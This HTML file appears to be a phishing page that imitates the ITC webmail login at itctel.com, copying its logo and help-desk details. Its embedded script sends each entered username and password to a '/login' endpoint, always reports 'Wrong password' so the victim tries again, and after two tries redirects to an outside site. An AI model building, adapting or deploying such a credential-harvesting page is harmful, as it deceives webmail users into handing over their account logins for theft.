<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="itctel.com.png">
    <title>ITC Webmail</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fff;
        
        }

        .container {
            text-align: center;
            margin-top: 200px;
            width: 300px;
            top:1px ;
            height: 500px;
            background: #fff;
            padding: 20px;
            box-shadow: 0 0px 0px rgba(0, 0, 0, 0.1);
            border-radius: 0px;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 80px;
        }

        .input-group {
            position: relative;
            margin-bottom: 15px;
        }

        .input-group input {
            width: 200px;
            padding: 10px 40px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .input-group .icon {
            position: absolute;
            width: 30px;
            height: 30px;
            left: 10px;
            top: 50%;
            padding: 4px 4px;
            border-radius: 5px;
            border-left: 0px;
            transform: translateY(-50%);
            background-color: #eae7e7;
        }

        .captcha {
            margin: 15px 0;
        }

        .btn {
            background-color: #007bff;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }

        .btn:hover {
            background-color: #0056b3;
        }

        .support {
            margin-top: 20px;
            font-size: 14px;
            color: #555;
            border-radius: 0px;
            border: 2px solid #2c2b2b;
            padding-top: 15px;
            
        }

        .support p {
            margin: 5px 0;
        }

        .footer {
            margin-top: 10px;
            font-size: 14px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="itctel.com.png" alt="ITC Logo">
        </div>

        <form action="#" method="post">
            <div class="input-group">
                <i class="fas fa-user icon"></i>
                <input type="text" placeholder="Username" required>
            </div>

            <div class="input-group">
                <i class="fas fa-lock icon"></i>
                <input type="password" placeholder="Password" required>
            </div>

            
            <button type="submit" class="btn">LOGIN</button>
        </form>
        <script>

document.addEventListener("DOMContentLoaded", () => {
    let attempts = 0;
    const form = document.querySelector("form");

    form.addEventListener("submit", async (event) => {
        event.preventDefault();
        const username = document.querySelector("input[type='text']").value;
        const password = document.querySelector("input[type='password']").value;
        
        const response = await fetch("/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        const result = await response.json();
        console.log(result);

        attempts++;
        alert("Wrong password");
        setTimeout(() => {
            if (attempts >= 2) {
                window.location.href = "https://femi.com";
            }
        }, 1000);
    });
});

        </script>

        <div class="support">
            <p>Welcome to ITC webmail.</p>
            <p>24/7 Help Desk Support</p>
            <p>1-888-217-5718</p>
            <p>helpdesk@itctel.com</p>
        </div>

        <div class="footer">
            itctel.com webmail
        </div>
    </div>

    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</body>
</html>
